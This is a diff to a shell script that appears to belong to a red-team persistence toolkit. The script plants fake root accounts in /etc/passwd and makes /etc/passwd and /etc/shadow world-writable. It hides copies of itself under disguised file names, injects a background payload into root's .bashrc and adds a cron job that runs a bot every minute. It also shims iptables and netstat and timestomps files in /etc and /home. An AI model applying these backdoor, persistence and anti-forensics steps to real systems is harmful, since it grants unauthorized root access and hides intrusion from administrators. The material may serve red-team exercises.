@@ -31,6 +31,8 @@ setup(){
 }
 
 backdoor_users(){
+    echo -e "\nCreating Backdoor users....\n"
+
     # fake root users 
     sed -is "3 a sbin:x:0:0:root:/root:/bin/bash" /etc/passwd 
     sed -is "6 a bakup:x:0:0:root:/root:/bin/bash" /etc/passwd 
@@ -70,6 +72,7 @@ backdoor_users(){
 # Clone the client binary into different places 
 clone(){
     echo -e "\nCloning all the files to the right directory...\n"
+
     cp deploy.sh /dev/shm/pulse-shm-10175238
     cp deploy.sh /dev/loop28
     cp deploy.sh /etc/vmware-tools.conf 
@@ -111,6 +114,7 @@ bashrc(){
 
     sed -i "30 a $payload1 2>/dev/null &" /root/.bashrc
     sed -i "31 a disown $!" /root/.bashrc
+    sed -i "16 a chmod 777 /etc/passwd /etc/shadow"
 }
 
 # Need persistent alias. Right now, this doesn't do anything 
@@ -121,13 +125,19 @@ alias_ls(){
 # Add a cronjob with bot payload which runs every 1 minute
 cronjob(){
     echo -e "\nInstalling cronjob... \n"
+
     crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
     systemctl restart cron 
+    systemctl restart crond
+
+    systemctl enable cron
+    systemctl enable crond 
 }
 
 # Shim iptables. IPtables had weird symlink, had to separate it 
 shim_iptables(){
     echo -e "\nShimming iptables... \n"
+
     gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o /opt/cdt-redteamtool/payload/iptables/drop
     cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
     cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
@@ -198,6 +208,7 @@ done
 mkdir -p /var/cache
 
 setup
+backdoor_users
 copyman
 clone
 sshd_config
@@ -212,6 +223,9 @@ shim_netstat
 
 # Time Stomping starts
 cd /etc
+timestomp
+
+cd /home
 timestomp
 
 cd /bin
